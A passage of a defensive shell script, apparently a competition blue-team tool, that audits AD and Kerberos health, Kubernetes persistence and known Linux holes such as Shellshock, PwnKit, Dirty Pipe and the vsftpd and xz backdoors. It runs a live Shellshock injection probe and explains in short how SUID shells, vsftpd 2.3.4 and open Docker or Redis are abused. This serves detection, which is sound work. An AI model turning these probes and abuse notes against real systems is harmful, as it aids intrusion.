    [ -d /sys/kernel/security/apparmor ] && say "  AppArmor profiles loaded: $(grep -c . /sys/kernel/security/apparmor/profiles 2>/dev/null)"
    have getenforce && say "  SELinux: $(getenforce 2>/dev/null)"
    if [ -n "$cm_d$cm_p" ]; then
        [ -n "$cm_d" ] && { say "  blocked since $cm_since (count, what was blocked):"; say "$cm_d" | sed 's/^/   /'; }
        [ -n "$cm_p" ] && { say "  AppArmor profiles added or changed after the baseline, from no package:"; say "$cm_p" | sed 's/^/    /'; }
        flag
        nxt "if a scored service is blocked: look at its profile. A planted profile: copy it to evidence, then apparmor_parser -R <file> and delete it."
        why "a block shows up as 'Permission denied' in the service's own log, which looks like a file problem."
        byhand "journalctl -k | grep DENIED ; aa-status ; ausearch -m avc -ts recent ; restorecon -Rv <path> (SELinux labels)"
    else
        ok "nothing was blocked, and no new AppArmor profile appeared"
    fi
}

# ---------------------------------------------------------------- domain (AD) health for this box
# At Invitational 2 most red services did not come from the Linux boxes: they came
# from AD on the DC (deleted, locked and disabled users) and from marvin's computer
# account password being changed in AD. Last year the DC fell and took Linux with
# it. This shows whether the domain is working FOR this box.
DOM='' DOMKIND='' REALM=''
domain_detect() {
    DOM='' DOMKIND=''
    if have realm; then
        DOM=$(realm list 2>/dev/null | awk '/^[^ \t]/ {d = $1} /configured: kerberos-member/ {print d; exit}')
        [ -n "$DOM" ] && DOMKIND="realmd + $(realm list 2>/dev/null | awk -F': ' '/client-software/ {print $2; exit}')"
    fi
    if [ -z "$DOM" ] && [ -f /etc/sssd/sssd.conf ]; then
        DOM=$(awk -F= '/^[[:space:]]*(ad_domain|krb5_realm)[[:space:]]*=/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/sssd/sssd.conf 2>/dev/null)
        [ -n "$DOM" ] || DOM=$(sed -n 's/^[[:space:]]*\[domain\/\([^]]*\)\].*/\1/p' /etc/sssd/sssd.conf 2>/dev/null | head -1)
        [ -n "$DOM" ] && DOMKIND=sssd
    fi
    if [ -z "$DOM" ] && grep -q -i -E '^[[:space:]]*security[[:space:]]*=[[:space:]]*ads' /etc/samba/smb.conf 2>/dev/null; then
        DOM=$(awk -F= 'tolower($1) ~ /^[[:space:]]*realm[[:space:]]*$/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/samba/smb.conf)
        DOMKIND=winbind
    fi
    REALM=$(awk -F= '/^[[:space:]]*default_realm/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/krb5.conf 2>/dev/null)
    if [ -z "$DOM" ] && [ -n "$REALM" ]; then DOM=$REALM; DOMKIND='Kerberos client only'; fi
    DOM=$(printf '%s' "$DOM" | tr 'A-Z' 'a-z')
    [ -n "$REALM" ] || REALM=$(printf '%s' "$DOM" | tr 'a-z' 'A-Z')
}
samba_dc_here() { [ -f /var/lib/samba/private/sam.ldb ] && { pgrep -x samba >/dev/null 2>&1 || grep -q -i 'active directory domain controller' /etc/samba/smb.conf 2>/dev/null; }; }
kdc_here() { have kadmin.local && { pgrep -x krb5kdc >/dev/null 2>&1 || ls /etc/krb5kdc/kdc.conf /var/kerberos/krb5kdc/kdc.conf /var/lib/krb5kdc/kdc.conf >/dev/null 2>&1; }; }

domain_dcs() {   # IPv4 addresses of the domain controllers
    dd_l=$(dns_srv "_ldap._tcp.dc._msdcs.$DOM" | while read -r dd_h _; do resolve4 "$dd_h"; done)
    [ -n "$dd_l" ] || dd_l=$(resolve4 "$DOM")
    if [ -z "$dd_l" ] && [ -f /etc/sssd/sssd.conf ]; then
        dd_l=$(awk -F= '/^[[:space:]]*(ad_server|ldap_uri|krb5_server)[[:space:]]*=/ {print $2}' /etc/sssd/sssd.conf |
            tr ', ' '\n\n' | sed 's|.*//||; s|:.*||' | grep . | while read -r dd_h; do
                if valid_ip "$dd_h"; then say "$dd_h"; else resolve4 "$dd_h"; fi; done)
    fi
    printf '%s\n' "$dd_l" | grep . | sort -u | head -3
}

dc_time_gap() {   # seconds this box is ahead of the DC ($1); empty if it cannot tell
    have ldapsearch || return 1
    dt_v=$(tmo ldapsearch -x -LLL -o nettimeout=4 -H "ldap://$1" -b '' -s base currentTime 2>/dev/null | awk '/^currentTime:/ {print substr($2, 1, 14)}')
    [ -n "$dt_v" ] || return 1
    say $(( $(date -u +%s) - $(ymdhms_epoch "$dt_v") ))
}

machine_account_test() {   # one line: OK or the error
    if [ ! -f /etc/krb5.keytab ]; then say "no /etc/krb5.keytab (not joined with a computer account)"; return 0; fi
    if have adcli; then
        ma_o=$(tmo adcli testjoin 2>&1)
        case "$ma_o" in *Successfully*) say "OK ($(printf '%s' "$ma_o" | head -1))" ;; *) say "FAILED: $(printf '%s' "$ma_o" | tail -1)" ;; esac
        return 0
    fi
    if have kinit && have klist; then
        ma_p=$(klist -k /etc/krb5.keytab 2>/dev/null | awk '$2 ~ /\$@/ {print $2; exit}')
        [ -n "$ma_p" ] || { say "cannot tell (no computer account in the keytab)"; return 0; }
        if ma_o=$(KRB5CCNAME=MEMORY: tmo kinit -k -t /etc/krb5.keytab "$ma_p" 2>&1); then say "OK (kinit as $ma_p)"
        else say "FAILED: $(printf '%s' "$ma_o" | tail -1)"; fi
        return 0
    fi
    say "cannot tell (install adcli or krb5-user to test it)"
}

chk_domain() {
    domain_detect
    if [ -z "$DOM" ] && ! samba_dc_here && ! kdc_here; then return 0; fi
    sec domain "Domain: is AD (or Kerberos) working for this box? (T1531, T1098, T1078.002)"
    cd_bad=0
    if [ -n "$DOM" ]; then
        cd_dcs=$(domain_dcs)
        say "  joined to: $DOM ($DOMKIND)   domain controllers: $(printf '%s ' $cd_dcs)"
        [ -n "$cd_dcs" ] || { say "  cannot find a DC: DNS has no records for $DOM. Check /etc/resolv.conf points at the DC."; cd_bad=1; }
        for cd_ip in $cd_dcs; do
            cd_line="  DC $cd_ip:"
            for cd_pt in 88 389; do
                tcp_ok "$cd_ip" "$cd_pt"
                case $? in 0) cd_line="$cd_line port $cd_pt open," ;; 1) cd_line="$cd_line port $cd_pt CLOSED,"; cd_bad=1 ;; *) cd_line="$cd_line port $cd_pt not tested," ;; esac
            done
            say "${cd_line%,}"
            if cd_gap=$(dc_time_gap "$cd_ip"); then
                cd_abs=${cd_gap#-}
                if [ "$cd_abs" -gt 240 ]; then say "  clock: $cd_gap seconds off this DC. Kerberos fails past 300."; cd_bad=1
                else say "  clock: $cd_gap seconds off this DC (fine; Kerberos fails past 300)"; fi
            fi
        done
        cd_ma=$(machine_account_test)
        say "  computer account: $cd_ma"
        case "$cd_ma" in FAILED*) cd_bad=1 ;; esac
        if have sssctl; then
            cd_s=$(tmo sssctl domain-status "$DOM" 2>/dev/null | awk -F': ' '/Online status/ {print $2; exit}')
            [ -n "$cd_s" ] && say "  sssd says the domain is: $cd_s"
            [ "$cd_s" = Offline ] && cd_bad=1
        elif [ "$DOMKIND" != 'Kerberos client only' ] && have pgrep && ! pgrep -x sssd >/dev/null 2>&1 && ! pgrep -x winbindd >/dev/null 2>&1; then
            say "  sssd and winbind are NOT running: domain logins on this box fail."
            cd_bad=1
        fi
        cd_u=''
        for cd_t in "administrator@$DOM" "Administrator@$DOM" "$(printf '%s' "$REALM" | cut -d. -f1)\\administrator"; do
            getent passwd "$cd_t" >/dev/null 2>&1 && { cd_u=$cd_t; break; }
        done
        if [ -n "$cd_u" ]; then say "  domain accounts resolve here: yes ($cd_u)"
        else say "  domain accounts resolve here: NO (getent passwd administrator@$DOM found nothing)"; cd_bad=1; fi
        cd_e=$( { if have journalctl; then journalctl -u sssd -u winbind --since -1h -q --no-pager 2>/dev/null; fi
                  tail -n 300 /var/log/sssd/*.log 2>/dev/null; } |
            grep -o -i -E 'preauthentication failed|clock skew too great|cannot contact any kdc|cannot find kdc|client .{1,60} not found in kerberos database|invalid credentials|keytab contains no suitable keys|going offline' |
            tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -5)
        [ -n "$cd_e" ] && { say "  domain errors in the last hour (count, error):"; say "$cd_e" | sed 's/^/   /'; cd_bad=1; }
    fi
    if samba_dc_here; then
        say "  THIS BOX IS A SAMBA DOMAIN CONTROLLER."
        cd_r=$(tmo samba-tool drs showrepl --summary 2>&1 | tail -3)
        [ -n "$cd_r" ] && say "  replication: $(printf '%s' "$cd_r" | tr '\n' ' ')"
        case "$cd_r" in *ALL\ GOOD*|'') ;; *) cd_bad=1 ;; esac
        cd_users="$VAULT/samba_users_$HOST.txt"
        cd_now=$(tmo samba-tool user list 2>/dev/null | sort)
        if [ -n "$cd_now" ]; then
            if [ -f "$cd_users" ]; then
                cd_gone=$(printf '%s\n' "$cd_now" | awk 'NR == FNR {n[$0] = 1; next} !($0 in n)' - "$cd_users")
                cd_new=$(printf '%s\n' "$cd_now" | awk 'NR == FNR {o[$0] = 1; next} !($0 in o)' "$cd_users" -)
                [ -n "$cd_gone" ] && { say "  domain users GONE since the start (deleted?): $(printf '%s ' $cd_gone)"; cd_bad=1; }
                [ -n "$cd_new" ] && { say "  domain users NEW since the start: $(printf '%s ' $cd_new)"; cd_bad=1; }
            else
                printf '%s\n' "$cd_now" > "$cd_users"; chmod 600 "$cd_users"
                say "  saved the domain user list ($(printf '%s\n' "$cd_now" | grep -c .) users); later hunts show users that disappear."
            fi
        fi
        if have ldbsearch; then
            cd_lk=$(tmo ldbsearch -H /var/lib/samba/private/sam.ldb '(&(objectCategory=person)(objectClass=user))' sAMAccountName userAccountControl lockoutTime 2>/dev/null |
                awk '/^sAMAccountName:/ {u = $2} /^userAccountControl:/ {if (int($2 / 2) % 2 == 1) d = d " " u}
                     /^lockoutTime:/ {if ($2 + 0 > 0) l = l " " u} END {if (d != "") print "disabled:" d; if (l != "") print "locked:" l}')
            [ -n "$cd_lk" ] && say "$cd_lk" | sed 's/^/  /'
        fi
        byhand "samba-tool drs showrepl ; samba-tool user list ; samba-tool user enable <name> ; samba-tool user setpassword <name>"
    fi
    if kdc_here; then
        say "  THIS BOX IS A KERBEROS KDC (MIT krb5, like bedbug last year)."
        cd_pf="$VAULT/kdc_principals_$HOST.txt"
        cd_pn=$(tmo kadmin.local -q listprincs 2>/dev/null | grep '@' | sort)
        if [ -n "$cd_pn" ] && [ -f "$cd_pf" ]; then
            cd_new=$(printf '%s\n' "$cd_pn" | awk 'NR == FNR {o[$0] = 1; next} !($0 in o)' "$cd_pf" -)
            [ -n "$cd_new" ] && { say "  NEW Kerberos principals since the start: $(printf '%s ' $cd_new)"; cd_bad=1; }
        elif [ -n "$cd_pn" ]; then
            printf '%s\n' "$cd_pn" > "$cd_pf"; chmod 600 "$cd_pf"
            say "  saved the principal list ($(printf '%s\n' "$cd_pn" | grep -c .)); later hunts show new ones."
        fi
        for cd_acl in /etc/krb5kdc/kadm5.acl /var/kerberos/krb5kdc/kadm5.acl /var/lib/krb5kdc/kadm5.acl; do
            [ -f "$cd_acl" ] || continue
            cd_wide=$(grep -v -E '^[[:space:]]*(#|$)' "$cd_acl" | awk '$1 !~ /\/admin@/ && $2 ~ /\*/')
            [ -n "$cd_wide" ] && { say "  $cd_acl gives full admin to more than the /admin principals:"; say "$cd_wide" | sed 's/^/    /'; cd_bad=1; }
        done
        byhand "kadmin.local -q listprincs ; kadmin.local -q \"getprinc <name>\" ; cat /etc/krb5kdc/kadm5.acl"
    fi
    if [ "$cd_bad" = 1 ]; then
        flag
        nxt "fix the first problem above, then check the scoreboard. Port CLOSED: firewall or the DC is down. Clock: set it from the DC."
        say "        Computer account FAILED: rejoin (adcli join --ldap-passwd -U <admin> $DOM). Users missing or locked: sh first30.sh ad"
        why "when many services go red at once, find the ONE thing they share (AD, DNS, the firewall) before fixing them one by one."
    else
        ok "the DC answers, the clock is close, the computer account works, and domain accounts resolve"
    fi
}

# ---------------------------------------------------------------- Kubernetes
# Roadrunner ran Kubernetes at Invitational 2. Red team hides in a cluster with a
# CronJob or DaemonSet that brings their agent back, a privileged pod that mounts
# the host, or a new cluster-admin binding.
k8s_cmd() { if have kubectl; then tmo 15 kubectl "$@"; elif have k3s; then tmo 15 k3s kubectl "$@"; else return 1; fi; }
chk_k8s() {
    { have kubectl || have k3s; } || return 0
    tmo k8s_cmd get namespaces >/dev/null 2>&1 || return 0
    sec k8s "Kubernetes: cluster-admins, host-level pods, and things that come back (T1610, T1053.007)"
    ck_now="$VAULT/.k8s_now.$$"
    {
        tmo k8s_cmd get clusterrolebindings --no-headers -o custom-columns='N:.metadata.name,R:.roleRef.name,S:.subjects[*].name' 2>/dev/null |
            awk '$2 == "cluster-admin" {print "cluster-admin binding: " $1 " -> " $3}' | grep -v -E -- '-> (system:|kubeadm:|<none>)'
        tmo k8s_cmd get cronjobs,daemonsets -A --no-headers 2>/dev/null | awk '{print "comes back on its own: " $1 "/" $2}'
        tmo k8s_cmd get svc -A --no-headers 2>/dev/null | awk '$3 == "NodePort" || $3 == "LoadBalancer" {print "open to the network: " $1 "/" $2 " " $3 " " $6}'
        tmo k8s_cmd get pods -A --no-headers -o custom-columns='NS:.metadata.namespace,N:.metadata.name,P:.spec.containers[*].securityContext.privileged,HN:.spec.hostNetwork,HP:.spec.hostPID,V:.spec.volumes[*].hostPath.path' 2>/dev/null |
            awk '$3 ~ /true/ || $4 == "true" || $5 == "true" || $6 ~ /(^|,)\/(,|$)|docker\.sock|containerd\.sock|^\/etc|^\/root/ {print "host-level pod: " $1 "/" $2 "  privileged=" $3 " hostNetwork=" $4 " hostPID=" $5 " hostPath=" $6}' |
            sed -E 's/-[a-z0-9]{8,10}-[a-z0-9]{5}( |$)/-*\1/' | sort -u
    } > "$ck_now"
    ck_base="$VAULT/k8s_$HOST.txt"
    if [ ! -f "$ck_base" ]; then
        cp "$ck_now" "$ck_base"; chmod 600 "$ck_base"
        say "  saved the cluster picture ($(grep -c . "$ck_now") lines). Later hunts show what is NEW. Right now:"
        sed 's/^/    /' "$ck_now" | head -30
    else
        ck_new=$(awk 'NR == FNR {o[$0] = 1; next} !($0 in o)' "$ck_base" "$ck_now")
        if [ -n "$ck_new" ]; then
            say "  NEW since the start:"; say "$ck_new" | sed 's/^/    /'
            flag
            nxt "kubectl describe <kind> <name> -n <namespace>. If nobody on your team made it: save the YAML (kubectl get ... -o yaml > file), then delete it."
        else
            ok "nothing new in the cluster since the start ($(grep -c . "$ck_now") watched items)"
        fi
    fi
    rm -f "$ck_now"
    byhand "kubectl get pods -A -o wide ; kubectl get cronjobs,daemonsets -A ; kubectl get clusterrolebindings"
}

# ---------------------------------------------------------------- known bugs
# Old software and loose settings that red team breaks in with. Two kinds:
#  - settings anyone can see (anonymous FTP, SNMP "public", NFS no_root_squash)
#  - versions with a famous hole. Distributions fix holes WITHOUT changing the
#    version number, so a version alone is not proof. This reads the package's
#    changelog for the CVE number: listed = fixed. That is how admins check it.
BUGN=0
bug() {   # bug "what was found" "why it matters" "the fix"
    BUGN=$((BUGN + 1))
    say "  $BUGN. $1"
    say "     Why: $2"
    say "     Fix: $3"
}

pkg_has_cve() {   # pkg_has_cve CVE PACKAGE...: 0 = changelog lists the fix, 1 = it does not, 2 = cannot tell
    phc_c=$1; shift; phc_r=2
    for phc_p in "$@"; do
        if have dpkg; then
            for phc_f in /usr/share/doc/"$phc_p"/changelog.Debian.gz /usr/share/doc/"$phc_p"/changelog.gz; do
                [ -f "$phc_f" ] || continue
                gzip -dc "$phc_f" 2>/dev/null | grep -q -F "$phc_c" && return 0
                phc_r=1
            done
        elif have rpm; then
            rpm -q "$phc_p" >/dev/null 2>&1 || continue
            rpm -q --changelog "$phc_p" 2>/dev/null | grep -q -F "$phc_c" && return 0
            phc_r=1
        fi
    done
    return $phc_r
}
# A version in the affected range: report it as OPEN, FIXED or MAYBE (from the changelog).
cve_state() {   # cve_state CVE PACKAGE... -> prints OPEN, FIXED or MAYBE
    pkg_has_cve "$@"
    case $? in 0) say FIXED ;; 1) say OPEN ;; *) say MAYBE ;; esac
}

kernel_build_ymd() {   # the day the running kernel was built, YYYYMMDD
    uname -v 2>/dev/null | awk '{
        if (match($0, /\(20[0-9][0-9]-[01][0-9]-[0-3][0-9]\)/)) { d = substr($0, RSTART + 1, 10); gsub(/-/, "", d); print d; exit }
        split("Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec", mn, " ")
        for (i = 1; i <= 12; i++) mi[mn[i]] = i
        for (i = 1; i < NF; i++) if (($i in mi) && $(i + 1) ~ /^[0-9]+$/) { mo = mi[$i]; dy = $(i + 1) }
        if (mo && $NF ~ /^(19|20)[0-9][0-9]$/) printf "%s%02d%02d\n", $NF, mo, dy }'
}

# Settings checks, fast enough for every hunt.
bugs_settings() {
    for bs_f in /etc/vsftpd.conf /etc/vsftpd/vsftpd.conf; do
        [ -f "$bs_f" ] || continue
        if grep -q -i -E '^[[:space:]]*anonymous_enable[[:space:]]*=[[:space:]]*yes' "$bs_f"; then
            bs_w=''; grep -q -i -E '^[[:space:]]*anon_upload_enable[[:space:]]*=[[:space:]]*yes' "$bs_f" && bs_w=' and anyone may UPLOAD'
            bug "anonymous FTP is on in $bs_f$bs_w" "anyone can log in as 'anonymous' and read (or plant) files. Last year's playbook scenario 20." \
                "if the FTP check does not need it: anonymous_enable=NO in $bs_f, then restart vsftpd."
        fi
    done
    for bs_f in /etc/snmp/snmpd.conf /etc/snmpd.conf /usr/local/etc/snmp/snmpd.conf; do
        [ -f "$bs_f" ] || continue
        bs_c=$(grep -v -E '^[[:space:]]*#' "$bs_f" | grep -i -E '(rocommunity|rwcommunity|com2sec).*[[:space:]](public|private)([[:space:]]|$)|^[[:space:]]*rwcommunity' | head -3)
        [ -n "$bs_c" ] && bug "SNMP uses a default or writable community in $bs_f: $(printf '%s' "$bs_c" | tr '\n' ';')" \
            "'public' and 'private' are the first words red team tries. SNMP shows users, processes and software; rwcommunity can change settings." \
            "change the community to a long secret (and tell your lead if SNMP is scored), or remove rwcommunity, then restart snmpd."
    done
    if [ -f /etc/exports ]; then
        bs_c=$(grep -v -E '^[[:space:]]*(#|$)' /etc/exports | grep -E 'no_root_squash|\*\(rw|[[:space:]]\(rw' | head -3)
        [ -n "$bs_c" ] && bug "NFS shares that trust remote root or anyone: $(printf '%s' "$bs_c" | tr '\n' ';')" \
            "no_root_squash lets root on ANY machine that mounts the share act as root here (drop a SUID shell, edit files)." \
            "change no_root_squash to root_squash and limit the clients to your network, then exportfs -ra."
    fi
    for bs_f in /etc/samba/smb.conf /usr/local/etc/smb4.conf; do
        [ -f "$bs_f" ] || continue
        bs_c=$(awk '/^[[:space:]]*\[/ {s = $0; g = 0; w = 0}
            tolower($0) ~ /^[[:space:]]*(guest ok|public)[[:space:]]*=[[:space:]]*yes/ {g = 1}
            tolower($0) ~ /^[[:space:]]*(writable|writeable)[[:space:]]*=[[:space:]]*yes|^[[:space:]]*read only[[:space:]]*=[[:space:]]*no/ {w = 1}
            g && w && !(s in p) {p[s] = 1; print s}' "$bs_f")
        [ -n "$bs_c" ] && bug "Samba shares anyone can WRITE without a password: $(printf '%s' "$bs_c" | tr -d ' ' | tr '\n' ' ')" \
            "a guest can drop files there (web shells, scripts other users run) and read everything." \
            "set guest ok = no (or read only = yes) for that share, then smbcontrol all reload-config. Check the share is not scored first."
    done
    bs_l=" $(listen_ports) "
    case "$bs_l" in *" 2375 "*) bug "the Docker API listens on port 2375 with no TLS" "anyone who reaches it can start a container that mounts / and owns the box." \
        "remove -H tcp://0.0.0.0:2375 from the docker service (systemctl cat docker), then restart docker." ;; esac
    if [ -S /var/run/docker.sock ] && stat -c %a /var/run/docker.sock 2>/dev/null | awk '{d = substr($1, length($1)) + 0; exit !(d == 2 || d == 3 || d == 6 || d == 7)}'; then
        bug "/var/run/docker.sock can be written by everyone" "any account on the box can run docker, and docker is root." "chmod 660 /var/run/docker.sock"
    fi
    for bs_g in docker lxd disk; do
        bs_m=$(getent group "$bs_g" 2>/dev/null | cut -d: -f4)
        [ -n "$bs_m" ] && [ "$bs_m" != root ] && bug "accounts in the $bs_g group: $bs_m" \
            "the $bs_g group is the same as root: $bs_g members can read or change any file." \
            "if your team does not need it: gpasswd -d <account> $bs_g"
    done
    case "$bs_l" in *" 6379 "*)
        if have redis-cli && [ "$(tmo redis-cli -h 127.0.0.1 -p 6379 ping 2>/dev/null)" = PONG ]; then
            bug "Redis answers with no password (redis-cli ping says PONG)" "an open Redis lets anyone write files (SSH keys, cron jobs) as the redis account." \
                "set requirepass in redis.conf and bind it to the addresses that need it, then restart redis. Update the apps that use it."
        fi ;; esac
    case "$bs_l" in *" 3306 "*)
        if have mysql && tmo mysql --no-defaults -h 127.0.0.1 -u root --connect-timeout=3 -e 'select 1' >/dev/null 2>&1 </dev/null; then
            bug "MySQL/MariaDB lets root in with NO password over the network" "anyone who reaches port 3306 owns every database, and can often write files." \
                "set a root password (ALTER USER 'root'@'%' IDENTIFIED BY '...'), update apps that log in as root, and file a PCR if it is scored."
        fi ;; esac
    for bs_f in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf /var/lib/pgsql/*/data/pg_hba.conf; do
        [ -f "$bs_f" ] || continue
        bs_c=$(grep -v -E '^[[:space:]]*#' "$bs_f" | awk '$1 ~ /^host/ && $NF == "trust"' | head -3)
        [ -n "$bs_c" ] && bug "PostgreSQL trusts network logins with no password ($bs_f): $(printf '%s' "$bs_c" | tr '\n' ';')" \
            "'trust' means any password works, from those addresses." "change trust to scram-sha-256 (or md5), then reload PostgreSQL."
    done
    for bs_p in 23 512 513 514 79 69; do
        case "$bs_l" in *" $bs_p "*)
            bug "an old plain-text service listens on port $bs_p ($(case $bs_p in 23) echo telnet;; 512) echo rexec;; 513) echo rlogin;; 514) echo rsh;; 79) echo finger;; 69) echo tftp;; esac))" \
                "it sends passwords in clear text, or needs no password at all." \
                "if it is NOT scored, stop and disable it. If it is scored, keep it and use strong passwords." ;; esac
    done
    bs_w=$(awk -F: '($2 ~ /^\$1\$/ || ($2 ~ /^[A-Za-z0-9.\/]{13}$/)) {print $1}' /etc/shadow 2>/dev/null | tr '\n' ' ')
    [ -n "$bs_w" ] && bug "weak password hashes (MD5 or old DES) for: $bs_w" "these crack in seconds once red team copies /etc/shadow." \
        "set the passwords again (passwd <user>); new ones use the box's strong hash. PCR for scored accounts."
    bs_seen=' '
    for bs_b in find vim vim.basic vi less more nano awk gawk mawk perl python python2 python3 ruby lua php bash sh dash env tar zip cp nmap gdb tclsh; do
        for bs_d in /usr/bin /bin /usr/local/bin; do
            [ -u "$bs_d/$bs_b" ] || continue
            bs_r=$(readlink -f "$bs_d/$bs_b" 2>/dev/null)
            case "$bs_seen" in *" $bs_r "*) continue ;; esac
            bs_seen="$bs_seen$bs_r "
            bug "$bs_r has the SUID bit" \
                "SUID makes it run as its owner (root) for everyone, and $bs_b can open a shell: any account becomes root (GTFOBins)." \
                "chmod u-s $bs_r  (save evidence first: red team sets this)"
        done
    done
    if have getcap; then
        bs_c=$(getcap /usr/bin/python* /usr/bin/perl* /usr/bin/ruby* /usr/bin/node /usr/bin/php* /usr/bin/vim* /usr/bin/tar /usr/bin/gdb /usr/bin/openssl 2>/dev/null |
            grep -E 'cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace' | head -5)
        [ -n "$bs_c" ] && bug "programs with root-level capabilities: $(printf '%s' "$bs_c" | tr '\n' ';')" \
            "cap_setuid on an interpreter is a root shell for everyone; cap_dac_read_search reads /etc/shadow." \
            "setcap -r <program>"
    fi
}

# Version checks: fast, so they run every hunt too.
bugs_versions() {
    if have bash && env 'F30X=() { :;}; echo F30VULN' bash -c ':' 2>/dev/null | grep -q F30VULN; then
        bug "bash is open to Shellshock (CVE-2014-6271)" "any web CGI script or DHCP client that passes text to bash lets red team run commands." \
            "update bash from the box's own repos. If you cannot: turn off CGI scripts in the web server until you can."
    fi
    bv_x=$(xz --version 2>/dev/null | head -1)
    case "$bv_x" in *5.6.0*|*5.6.1*) bug "xz/liblzma 5.6.0 or 5.6.1 (CVE-2024-3094, the xz backdoor)" \
        "that version has a planted backdoor that lets its author log in through sshd." \
        "downgrade or update xz-utils/liblzma right away, then restart sshd." ;; esac
    if have sudo; then
        bv_s=$(sudo -V 2>/dev/null | awk 'NR == 1 {print $NF}')
        if [ -n "$bv_s" ] && { vin "$bv_s" 1.8.2 1.8.31p2 || vin "$bv_s" 1.9.0 1.9.5p1; }; then
            bv_st=$(cve_state CVE-2021-3156 sudo)
            [ "$bv_st" != FIXED ] && bug "sudo $bv_s: $bv_st for Baron Samedit (CVE-2021-3156)" "any account on the box can become root with a public exploit." \
                "update sudo. Until then, watch who logs in: every account on this box is a root account."
        fi
        if [ -n "$bv_s" ] && vin "$bv_s" 1.9.14 1.9.17; then
            bv_st=$(cve_state CVE-2025-32463 sudo)
            [ "$bv_st" != FIXED ] && bug "sudo $bv_s: $bv_st for the sudo chroot bug (CVE-2025-32463)" "any account can become root with 'sudo -R' and a planted library." \
                "update sudo (fixed in 1.9.17p1 and in distro updates from July 2025)."
        fi
    fi
    for bv_p in /usr/bin/pkexec /bin/pkexec; do
        [ -u "$bv_p" ] || continue
        bv_st=$(cve_state CVE-2021-4034 policykit-1 pkexec polkitd polkit)
        [ "$bv_st" != FIXED ] && bug "pkexec is SUID and PwnKit (CVE-2021-4034) is $bv_st" "any account becomes root with a famous one-line exploit." \
            "update polkit, or remove the SUID bit: chmod 0755 $bv_p (menu 14 does it with an undo)."
        break
    done
    if have ssh; then
        bv_o=$(ssh -V 2>&1 | sed -n 's/^OpenSSH_\([0-9][0-9.p]*\).*/\1/p')
        if [ -n "$bv_o" ] && vin "$bv_o" 8.5p1 9.7p1; then
            bv_st=$(cve_state CVE-2024-6387 openssh-server openssh)
            [ "$bv_st" != FIXED ] && bug "OpenSSH $bv_o: $bv_st for regreSSHion (CVE-2024-6387)" "a remote root exploit against sshd itself (slow and noisy, but real)." \
                "update openssh-server. Until then: LoginGraceTime 0 in sshd_config stops it (menu 14 sets 30, which narrows it)."
        fi
    fi
    if have ldd; then
        bv_g=$(ldd --version 2>&1 | awk 'NR == 1 {print $NF}')
        case "$bv_g" in 2.3[4-8]*)
            bv_st=$(cve_state CVE-2023-4911 libc6 glibc)
            [ "$bv_st" != FIXED ] && bug "glibc $bv_g: $bv_st for Looney Tunables (CVE-2023-4911)" "any account becomes root through a SUID program and one environment variable." \
                "update glibc (libc6), then reboot when your lead says so." ;;
        esac
    fi
    bv_kd=$(kernel_build_ymd)
    bv_kv=$(uname -r 2>/dev/null | awk -F'[.-]' '{print $1 "." $2}')
    if [ -n "$bv_kd" ] && [ -n "$bv_kv" ]; then
        if vin "$bv_kv" 2.6 4.8 && [ "$bv_kd" -lt 20161019 ]; then
            bug "kernel $(uname -r) was built before the Dirty COW fix (Oct 2016)" "any account becomes root (CVE-2016-5195)." "update the kernel and reboot (with your lead)."
        fi
        if vin "$bv_kv" 5.8 99 && [ "$bv_kd" -lt 20220223 ]; then
            bug "kernel $(uname -r) was built before the Dirty Pipe fix (Feb 2022)" "any account can overwrite read-only files, like /etc/passwd (CVE-2022-0847)." "update the kernel and reboot (with your lead)."
        fi
        if vin "$bv_kv" 3.15 6.7 && [ "$bv_kd" -lt 20240131 ]; then
            bv_ns=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null)
            [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = 0 ] && bv_ns=0
            [ "${bv_ns:-1}" != 0 ] && bug "kernel $(uname -r) was built before the nf_tables fix (Jan 2024), and user namespaces are on" \
                "a public exploit (CVE-2024-1086, used in real attacks) turns any account into root." \
                "update the kernel. Until then: sysctl -w user.max_user_namespaces=0 (menu 14; skip it on boxes that run rootless containers)."
        fi
    fi
    if [ -f /etc/webmin/version ]; then
        bv_w=$(cat /etc/webmin/version 2>/dev/null)
        vin "$bv_w" 1.890 1.920 && bug "Webmin $bv_w has the planted backdoor (CVE-2019-15107)" "anyone can run commands as root through the Webmin page." \
            "update Webmin, or stop it (systemctl disable --now webmin) if it is not scored."
    fi
    for bv_a in apache2 httpd; do
        have "$bv_a" || continue
        bv_v=$($bv_a -v 2>/dev/null | sed -n 's/.*Apache\/\([0-9.]*\).*/\1/p' | head -1)
        case "$bv_v" in 2.4.49|2.4.50) bug "Apache $bv_v (CVE-2021-41773 / CVE-2021-42013)" "path traversal: files outside the web root can be read, and with CGI on, commands run." \
            "update Apache (2.4.51 or newer)." ;; esac
        break
    done
    if have vsftpd; then
        bv_v=$(tmo vsftpd -v 2>&1 </dev/null | sed -n 's/.*version \([0-9.]*\).*/\1/p' | head -1)
        [ "$bv_v" = 2.3.4 ] && bug "vsftpd 2.3.4: the famous backdoored release" "a ':)' in the FTP user name opens a root shell on port 6200." "replace vsftpd with the package from the box's repos."
    fi
    if have proftpd; then
        bv_v=$(tmo proftpd -v 2>&1 | sed -n 's/.*Version \([0-9.a-z]*\).*/\1/p' | head -1)
        case "$bv_v" in 1.3.5*|1.3.6*)
            tmo proftpd -l 2>/dev/null | grep -q mod_copy.c && bug "ProFTPD $bv_v with mod_copy (CVE-2015-3306 / CVE-2019-12815)" \
                "anyone can copy files on the server without logging in (for example into the web root)." \
                "update ProFTPD, or turn off mod_copy (comment out LoadModule mod_copy.c), then restart it." ;; esac
    fi
}

# Slower checks, only in the full run (menu 15).
bugs_slow() {
    bl_j=$(find / -xdev \( -path /proc -o -path /sys -o -path "$VAULT" \) -prune -o -type f -name 'log4j-core-*.jar' -print 2>/dev/null | head -20)
    for bl_f in $bl_j; do
        bl_v=$(basename "$bl_f" .jar | sed 's/^log4j-core-//')
        if vin "$bl_v" 2.0 2.14.1 || [ "${bl_v#2.0-beta}" != "$bl_v" ]; then
